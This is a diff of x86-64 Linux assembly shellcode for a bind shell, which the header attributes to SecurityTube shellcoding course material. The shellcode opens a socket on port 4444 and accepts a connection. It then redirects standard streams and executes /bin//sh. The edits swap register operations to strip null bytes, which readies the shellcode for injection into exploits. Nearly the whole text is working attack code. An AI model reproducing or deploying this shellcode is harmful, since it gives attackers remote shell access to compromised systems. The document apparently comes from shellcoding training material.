@@ -1,7 +1,6 @@
 ; original code by http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html
 ; edited David @InfinitelyManic
 ; remove nulls from bind shell code
-; nasm -f elf64 -g -F dwarf bindshell_rm_nulls.s -o bindshell_rm_nulls.o  && ld bindshell_rm_nulls.o -o bindshell_rm_nulls
 
 section .text
         global _start
@@ -12,17 +11,16 @@ _start:
         ; SOCK_STREAM = 1
         ; syscall number 41
 
-        xor rax, rax
-        mov al, 41
+        xor eax, eax
+        add al, 41
 
-        xor rdi, rdi
-        inc edi
-        inc edi
+        xor edi, edi
+	add di, 2
 
-        xor rsi, rsi
+        xor esi, esi
         inc rsi
 
-        xor rdx, rdx
+        xor edx, edx
         syscall
 
         ; copy socket descriptor to rdi for future use
@@ -34,7 +32,7 @@ _start:
         ; server.sin_addr.s_addr = INADDR_ANY
         ; bzero(&server.sin_zero, 8)
 
-        xor rax, rax
+        xor eax, eax
         push rax
         mov dword [rsp-4], eax
         mov word [rsp-6], 0x5c11
@@ -44,28 +42,28 @@ _start:
 
         ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
         ; syscall number 49
-        xor rax, rax
-        mov al, 49
+        xor eax, eax
+      	add al, 49
 
         mov rsi, rsp
-        xor rdx, rdx
+        xor edx, edx
         mov dl, 16
         syscall
 
 
         ; listen(sock, MAX_CLIENTS)
         ; syscall number 50
-        xor rax, rax
-        mov al, 50
-        mov rsi, -1
-        add rsi, 3
+        xor eax, eax
+        add al, 50
+        mov esi, -1
+        add esi, 3
         syscall
 
 
         ; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
         ; syscall number 43
-        xor rax, rax
-        mov al, 43
+        xor eax, eax
+        add al, 43
         sub rsp, 16
         mov rsi, rsp
         mov byte [rsp-1], 16
@@ -79,28 +77,28 @@ _start:
 
         ; close parent
 
-        xor rax, rax
+        xor eax, eax
         mov al, 3
         syscall
         ; duplicate sockets
 
         ; dup2 (new, old)
         mov rdi, r9
-        xor rax, rax
+        xor eax, eax
         mov al, 33
-        xor rsi, rsi
+        xor esi, esi
         syscall
 
-        xor rax, rax
-        mov al, 33
-        xor rsi, rsi
-        inc rsi
+        xor eax, eax
+        add al, 33
+        xor esi, esi
+	add esi, 1
         syscall
 
-        xor rax, rax
-        mov al, 33
+        xor eax, eax
+        add al, 33
         mov rsi, -1
-        add rsi, 3
+        add esi, 3
         syscall
 
 
@@ -108,7 +106,7 @@ _start:
 
         ; First NULL push
 
-        xor rax, rax
+        xor eax, eax
         push rax
 
         ; push /bin//sh in reverse
@@ -135,4 +133,3 @@ _start:
         ; Call the Execve syscall
         add rax, 59
         syscall
-
